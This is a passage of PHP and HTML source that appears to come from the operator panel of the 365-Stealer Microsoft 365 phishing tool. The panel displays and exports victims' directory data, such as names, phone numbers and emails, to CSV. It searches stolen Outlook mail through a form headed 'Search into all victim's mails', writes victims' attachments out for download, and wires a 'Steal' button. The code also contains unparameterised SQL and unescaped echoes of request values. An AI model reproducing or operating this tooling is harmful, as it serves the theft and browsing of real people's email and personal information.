                           <th style="background-color:#ff8327; font-size: 13px; text-align: center;">
                              Mail
                           </th>
                           <th style="background-color:#ff8327; font-size: 13px; text-align: center;">
                              Mobile Phone
                           </th>
                           <th style="background-color:#ff8327; font-size: 13px; text-align: center;">
                              Office Location
                           </th>
                           <th style="background-color:#ff8327; font-size: 13px; text-align: center;">
                              Preferred Language
                           </th>
                           <th style="background-color:#ff8327; font-size: 13px; text-align: center;">
                              Id
                           </th>
                        </tr>
                     </thead>
                     <tbody>
                        <?php 
                           if(is_writable('users.csv')){
                            if(isset($_GET['exportuser'])){
                           	    //Delete the file
                           	    $deleted = unlink('users.csv');
                             }
                           }
                           while ($row = $res->fetchArray()) {
                           $displayName = $row['displayName'];
                           $givenName = $row['givenName'];
                           $jobTitle = $row['jobTitle'];
                           $mail = $row['mail'];
                           $mobilePhone = $row['mobilePhone'];
                           $officeLocation = $row['officeLocation'];
                           $preferredLanguage = $row['preferredLanguage'];
                           $surname = $row['surname'];
                           $userPrincipalName = $row['userPrincipalName'];
                           $id = $row['id'];
                                               
                           if(isset($_GET['exportuser'])){
                           
                           $list = array (
                            array($displayName, $givenName, $jobTitle, $mail, $mobilePhone, $officeLocation, $preferredLanguage, $surname, $userPrincipalName, $id)
                           );
                           $fp = fopen('users.csv', 'a');
                           foreach ($list as $fields) {
                            fputcsv($fp, $fields);
                           }
                           
                           fclose($fp);
                           }
                           
                            ?>
                        <tr>
                           <td class="text-left xs-hidden"><?php echo $displayName; ?></td>
                           <td class="text-left xs-hidden"><?php echo  $userPrincipalName; ?></td>
                           <td class="text-left xs-hidden"><?php echo  $givenName; ?></td>
                           <td class="text-left xs-hidden"><?php echo  $surname; ?></td>
                           <td class="text-left xs-hidden"><?php echo  $jobTitle;  ?></td>
                           <td class="text-left xs-hidden"><?php echo  $mail; ?></td>
                           <td class="text-left xs-hidden"><?php echo  $mobilePhone; ?></td>
                           <td class="text-left xs-hidden"><?php echo  $officeLocation;  ?></td>
                           <td class="text-left xs-hidden"><?php echo  $preferredLanguage;  ?></td>
                           <td class="text-left sm-hidden"><?php echo  $id;  ?></td>
                        </tr>
                        <?php } ?>
                     </tbody>
                  </table>
               </div>
               <?php if(isset($_GET['ListAllUsers'])){ ?>
               <form action="" method="get" class="text-center form-inline" style="margin: 10px 10px 10px 10px">
                  <button type="submit" class="btn btn-danger" style="width:100%">Cancel</button>
               </form>
               <?php }  ?>
            </div>
         </div>
         <?php  $db->close(); } ?>
         <br>
         <div class="row">
    <div class="col-xs-12">
        <div class="table-container" style="margin-bottom:100px; box-shadow: 10px 10px 5px rgba(185, 185, 185, 0.71);">
            <table class="table table-striped table-bordered">
                <thead">
                    <th style="background-color:rgba(104, 203, 255, 0.56); font-size: 13px;">Search into all victim's mails</th>
                </thead>
                <tbody>
                    <tr>
                        <td>
                            <form method="get" class="text-center form-inline">
                                <div class="row g-2">
                                    <div class="col-lg-3 col-md-6 col-sm-12">
                                        <input type="text" name="keyword" id="keyword" class="form-control w-100" value="<?php if(isset($_GET['keyword'])){echo $_GET['keyword'];} ?>" placeholder="Body contains...">
                                    </div>
                                    <div class="col-lg-3 col-md-6 col-sm-12">
                                        <input type="text" name="subject" id="subject" class="form-control w-100" value="<?php if(isset($_GET['subject'])){echo $_GET['subject'];} ?>" placeholder="Subject contains...">
                                    </div>
                                    <div class="col-lg-3 col-md-6 col-sm-12">
                                        <input type="text" name="user" id="user" class="form-control w-100" value="<?php if(isset($_GET['user'])){echo $_GET['user'];} ?>" placeholder="Sender email...">
                                    </div>
                                    <input type="hidden" name="dir" value="<?php if(isset($_GET['dir'])){echo $_GET['dir'];} ?>">
                                    <div class="col-lg-3 col-md-6 col-sm-12 d-flex align-items-center justify-content-center">
                                        <input type="checkbox" value="<?php if(isset($_GET['HasAttachments'])){echo $_GET['HasAttachments'];} ?>" name="HasAttachments" <?php if(isset($_GET['HasAttachments'])){echo 'checked';} ?>>
                                        <label class="ms-2">Has Attachments</label>
                                    </div>
                                    <div class="col-12 mt-3 d-flex justify-content-center gap-2">
                                        <button type="submit" class="btn btn-primary" name="submit">Search</button>
                                    </div>
                                </div>
                            </form>
                        </td>
                    </tr>
                </tbody>
            </table>
                  <div style="overflow-y: scroll;max-height:800px;width:100%;background-color:#90d0ff;margin-right:20%">
                     <?php 
                        if(isset($_GET['keyword']) && isset($_GET['user']) && isset($_GET['subject'])){
                           $keyword = $_GET['keyword'];
                           $user = $_GET['user'];
                           $subject = $_GET['subject'];
                       
                           $HasAttachments = '';
                           if(isset($_GET['HasAttachments'])){
                               $HasAttachments = 'and HasAttachments = :hasAttachments';
                           }
                       
                           $db = new SQLite3("$listing->databasePath");
                       
                           // Prepare the SQL statement with placeholders
                           $sql = "SELECT * FROM outlook WHERE Body LIKE :keyword 
                                   AND Subject LIKE :subject 
                                   AND Sender LIKE :user $HasAttachments 
                                   ORDER BY 1 DESC";
                           $stmt = $db->prepare($sql);
                       
                           // Bind the actual values to the placeholders
                           $stmt->bindValue(':keyword', "%$keyword%", SQLITE3_TEXT);
                           $stmt->bindValue(':subject', "%$subject%", SQLITE3_TEXT);
                           $stmt->bindValue(':user', "%$user%", SQLITE3_TEXT);
                       
                           if(isset($_GET['HasAttachments'])){
                               $stmt->bindValue(':hasAttachments', true, SQLITE3_INTEGER);
                           }
                       
                           // Execute the statement
                           $res = $stmt->execute();

                         while ($row = $res->fetchArray()) {
                             $id = $row['id'];
                             $username = $row['username'];
                             $body = $row['Body'];
                             $sender = $row['Sender'];
                             $toRecipients = $row['ToRecipients'];
                             $bccRecipients = $row['BccRecipients'];
                             $replyto = $row['ReplyTo'];
                             $subject = $row['Subject'];
                             $flag = $row['Flag'];
                             $hasAttachments = $row['HasAttachments'];
                             $ccrecipients = $row['CcRecipients'];
                             $date = $row['date'];
                        
                                         ?>  
                     <div class="col-md-6">
                        <div class="row inbox-wrapper" style="margin:40px">
                           <div>
                              <div class="card">
                                 <div class="card-body">
                                    <div class="row">
                                       <div class="col-lg-15 email-content">
                                          <div class="email-head">
                                             <div class="email-head-subject">
                                                   <div class="title d-flex align-items-center justify-content-between">
                                                      <div class="d-flex align-items-center">
                                                            <a class="active" href="#">
                                                               <span class="icon">
                                                                  <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-star text-primary-muted">
                                                                        <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"></polygon>
                                                                  </svg>
                                                               </span>
                                                            </a>
                                                            <b><span style="font-size:25px"><?php echo $subject; ?></span></b>
                                                      </div>
                                                      <div class="ml-auto" style="color:#ff6c00">
                                                            <?php if ($hasAttachments == '1') { echo "<b>Attachment found!</b>"; } ?>
                                                      </div>
                                                   </div>
                                                </div>
                                             <div class="email-head-sender d-flex align-items-center justify-content-between flex-wrap">
                                                <div class="d-flex align-items-center">
                                                   <div class="sender d-flex flex-column align-items-start">
                                                   <div><b>Sender:</b> <a><?php echo $sender; ?></a></div>
                                                   <div><b>ToRecipients:</b> <?php echo $toRecipients; ?></div>
                                                      <!-- --                                                      
                                                         <b>BccRecipients: </b><a href="#"><?php echo $bccRecipients; ?></a><br>
                                                         <b>CcRecipients: </b><a href="#"><?php echo $ccrecipients; ?></a>
                                                         --->  
                                                   </div>
                                                </div>
                                                <div class="date"><b>Date: </b><?php echo date("Y-m-d H:i:s", strtotime($date)); ?></div>
                                             </div>
                                          </div>
                                          <b>Body: </b>
                                          <div style="max-height: 800px;overflow: scroll;background-color:white;border-style: groove">
                                             <div style="margin:10px">
                                                <?php echo $body;?>
                                             </div>
                                          </div>
                                          <br>
                                          <?php 
                                             $resA = $db->query("SELECT  * from Attachments where id = '$id' order by 1 DESC");
                                             $count = $db->querySingle("SELECT COUNT(*) as count FROM Attachments where id ='$id'");
                                             
                                              while ($rowA = $resA->fetchArray()) {  
                                                       $filename = $rowA['filename'];
                                                       $blobdata = $rowA['data'];
                                                       $size = $rowA['size'];
                                                       if (!file_exists("./".$username."/.tmp/")) {
                                                           mkdir("./".$username."/.tmp/", 0777, true);
                                                       }
                                                       $filepath = "./".$username."/.tmp/".$filename;
                                                     
                                                       $Afile = fopen($filepath, "w") or die("Unable to open file!");
                                                       fwrite($Afile, $blobdata);
                                                       $txt = "Jane Doe\n";
                                                       fwrite($Afile, $txt);
                                                       fclose($Afile);
                                                           ?>        
                                          <div class="email-attachments">
                                             <ul >
                                                <li>
                                                   <a href="<?php echo $filepath; ?>" target="_blank" download>
                                                      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file">
                                                         <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path>
                                                         <polyline points="13 2 13 9 20 9"></polyline>
                                                      </svg>
                                                      <b><?php echo $filename; ?><span class="text-muted tx-11">(<?php echo $size; ?>)</span></b>
                                                   </a>
                                                </li>
                                             </ul>
                                          </div>
                                          <?php } ?>         
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <?php } } 
                        $db->close();
                        ?>
                  </div>
                  <br>
                  <?php 
                     if(isset($_GET['keyword'])){
                     
                     ?>
                  <form action="" method="get" class="">
                     <button type="submit" class="btn btn-danger" style="width:100%">Cancel</button>
                  </form>
                  <br><br><br>
                  <?php } 
                     }
                     ?>
               </div>
            </div>
         </div>
         <div style="position: fixed;
            left: 0;
            bottom: 0;
            width: 100%;
            background-color: #0093ff;
            color: white;
            text-align: center;">
            <center >
               <p style="margin-top:10px"><a href="https://twitter.com/AlteredSecurity" target="_blank" style="color:#ffffff"> <img src="assets/img/twitter.png" width="30px"><b> @Altered Security</b></a>&emsp;&emsp;&emsp;|&emsp;&emsp;&emsp;
                  <a href="https://github.com/alteredsecurity/365-Stealer" target="_blank" style="color:#ffffff"><img src="assets/img/GitHub.png" width="30px"><b> 365-Stealer</b></a>
               </p>
            </center>
         </div>
      </div>
      <link href="assets/css/logo.css" rel="stylesheet">
      <?php if(isset($_GET['exportuser'])){ 
         if(file_exists('./users.csv')){
         ?>
      <a id="exportuser" style="display: none" href="./users.csv"></a>
      <script>
         document.getElementById('exportuser').click();
      </script>
      <?php }} ?>
      <script>
         document.addEventListener("DOMContentLoaded", function() {
            // Use event delegation to handle the "change" event on checkboxes within .steal-again-section dynamically
            document.body.addEventListener('change', function(e) {
               const target = e.target;

               // Check if the target is a "select all" checkbox
               if (target.classList.contains('select-all-checkbox')) {
                     const section = target.closest('.steal-again-section');
                     const checkboxes = section.querySelectorAll('.form-check-input:not(.select-all-checkbox)');
                     const stealButton = section.querySelector('.steal-button');

                     checkboxes.forEach(function(checkbox) {
                        checkbox.checked = target.checked;
                     });

                     stealButton.disabled = !Array.from(checkboxes).some(checkbox => checkbox.checked);
               } 

               // Handle the individual checkbox logic
               else if (target.classList.contains('form-check-input') && !target.classList.contains('select-all-checkbox')) {
                     const section = target.closest('.steal-again-section');
                     const selectAllCheckbox = section.querySelector('.select-all-checkbox');
                     const checkboxes = section.querySelectorAll('.form-check-input:not(.select-all-checkbox)');
                     const stealButton = section.querySelector('.steal-button');

                     if (!target.checked) {
                        selectAllCheckbox.checked = false;
                     } else {
                        if (Array.from(checkboxes).every(function(cb) { return cb.checked; })) {
                           selectAllCheckbox.checked = true;
                        }
                     }

                     stealButton.disabled = !Array.from(checkboxes).some(checkbox => checkbox.checked);
               }
            });

            // Initial state of the "Steal" button on page load
            document.querySelectorAll('.steal-again-section').forEach(function(section) {
               const checkboxes = section.querySelectorAll('.form-check-input:not(.select-all-checkbox)');
               const stealButton = section.querySelector('.steal-button');
               stealButton.disabled = !Array.from(checkboxes).some(checkbox => checkbox.checked);
            });
         });
   </script>
   </body>
</html>